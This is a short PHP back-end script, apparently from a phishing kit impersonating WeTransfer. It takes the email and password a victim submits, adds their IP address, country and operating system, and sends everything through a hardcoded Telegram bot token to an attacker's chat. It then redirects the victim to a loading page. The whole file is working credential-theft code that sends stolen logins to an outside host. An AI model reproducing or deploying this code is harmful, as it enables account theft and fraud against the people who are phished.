<?php

session_start();
include_once 'functions.php';
include_once './bots/father.php';

	
$message = '[🚦] +1 WETRANSFER LOG [🚦]' . "\r\n\n";

$message .= '✏️EMAIL  : ' . $_POST['email'] . "\r\n\n";
$message .= '✏️PASSWORD  : ' . $_POST['password'] . "\r\n\n";

$message .= '[⛓️‍💥] TIERS [⛓️‍💥]' . "\r\n\n";

$message .= '🛰 IP : ' . get_user_ip() . "\r\n";
$message .= '🌍 Pays : ' . get_user_country() . "\r\n";
$message .= '🤖 Systeme : ' . get_user_os() . "\r\n";


file_get_contents("https://api.telegram.org/bot7620976671:AAET4ntwinnMvxI6Vd0Yv0zrlVcwaS9d_qQ/sendMessage?chat_id=6844140365&text=" . urlencode($message)."" );

    header('location: load.php');

?>